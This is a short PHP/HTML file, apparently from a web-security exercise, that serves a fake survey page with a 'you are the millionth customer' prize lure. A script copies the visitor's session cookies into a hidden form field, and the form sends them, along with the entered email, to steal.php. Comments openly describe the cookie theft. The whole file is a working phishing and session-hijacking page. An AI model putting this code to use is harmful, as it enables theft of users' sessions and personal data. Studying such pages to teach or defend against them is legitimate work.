<?php
session_start();

// Verificar si el usuario está autenticado
if (!isset($_SESSION['user_id'])) {
    header("Location:/FrontEnd/FormularioLogin/FormularioLogin.html");
    exit();
}

?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario Legítimo</title>
</head>
<body>
    <h1>¡Formulario de Encuesta!</h1>
    <form id="formMalicioso" action="steal.php" method="POST">
        <input type="hidden" name="cookie" id="cookieInput">
        <h1>¡¡¡¡Eres el cliente 1 millon!!!!</h1>
        <h2>Introduce tu email para recibir tu premio</h2>
        <input type="text" name="email" id="email" placeholder="Escribe tu email">
        <button type="submit">Enviar Encuesta</button>
    </form>

    <script>
        // Robar la cookie del sitio (a) y asignarla al formulario
        document.getElementById('cookieInput').value = document.cookie;
    </script>
</body>
</html> 